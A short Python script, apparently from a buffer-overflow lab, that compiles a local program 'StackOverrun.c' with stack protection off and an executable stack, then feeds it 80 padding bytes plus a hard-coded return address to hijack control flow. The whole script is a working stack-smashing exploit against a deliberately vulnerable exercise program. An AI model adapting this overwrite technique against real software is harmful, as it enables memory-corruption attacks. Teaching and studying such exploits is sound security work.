from subprocess import call

argument = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".encode() + b'\x2a\x07\xe0\x74\xb7\x7f'

call(['gcc', 'StackOverrun.c', '-o', 'StackOverrun', '-fno-stack-protector', '-z', 'execstack'])
call(['./StackOverrun', argument])